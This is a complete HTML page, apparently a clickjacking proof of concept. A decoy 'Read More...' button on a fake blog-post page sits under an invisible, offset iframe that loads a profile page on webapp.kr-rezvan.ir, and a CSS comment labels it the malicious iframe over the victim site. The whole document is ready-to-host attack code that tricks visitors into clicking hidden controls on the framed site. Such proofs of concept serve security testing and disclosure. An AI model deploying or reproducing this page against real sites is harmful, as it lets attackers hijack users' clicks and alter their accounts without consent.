<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Read our new Blog Post!</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f5; text-align: center; padding-top: 50px; }
        .bait-container { position: relative; width: 600px; height: 400px; margin: 0 auto; border: 2px dashed #a1a1aa; background: #fff; overflow: hidden; }
        .bait-button {
            position: absolute;
            top: 175px;
            left: 220px;
            width: 200px;
            height: 50px;
            background-color: #22c55e;
            color: white;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            z-index: 1;
        }

        /* The malicious iframe loading the victim site */
        .malicious-iframe {
            position: absolute;
            width: 1200px;
            height: 1500px;
            top: -404px;
            left: -580px;
            border: none;
            z-index: 2;
            opacity: 0;
        }
    </style>
</head>
<body>
    <h1>Check out our latest article!</h1>
    <div class="bait-container">
        <button class="bait-button">Read More...</button>
        <iframe class="malicious-iframe" src="https://webapp.kr-rezvan.ir/profile?allow_framing=true" scrolling="no"></iframe>
    </div>
</body>
</html>